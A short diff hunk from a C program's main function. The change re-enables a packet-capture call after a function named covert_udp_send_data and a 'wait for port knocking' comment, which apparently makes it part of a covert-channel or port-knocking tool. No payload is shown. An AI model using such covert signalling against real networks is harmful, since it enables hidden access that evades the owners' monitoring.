@@ -84,7 +84,7 @@ int main(int argc, char **argv){
 	//wait for port knocking
     printf("Filter: %s\n",pcapfilter);
     covert_udp_send_data(Filter.localip, Filter.targetip, UPORT, UPORT, buf, 1);
-	//Packetcapture(pcapfilter,Filter,true);
+	Packetcapture(pcapfilter,Filter,true);
     exit(1);
     return 0;
 }
